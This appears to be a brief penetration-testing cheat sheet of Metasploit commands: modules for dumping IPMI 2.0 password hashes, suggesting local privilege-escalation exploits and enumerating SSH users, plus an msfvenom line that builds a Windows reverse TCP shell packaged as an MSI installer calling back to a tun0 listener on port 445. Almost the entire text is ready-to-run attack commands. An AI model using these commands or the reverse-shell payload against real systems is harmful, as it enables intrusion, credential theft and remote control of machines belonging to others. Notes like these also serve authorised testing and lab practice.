# MSFconsole
## IPMI Hash Dump
[IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
```shell-session
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
```
## Local Exploit Suggestor
```shell-session
msf> use multi/recon/local_exploit_suggester
```
## SSH User Enumeration
```metasploit
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
# MSFvenom
## Generate Payload
- msi
```shell-session
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=445 -f msi > shell.msi
```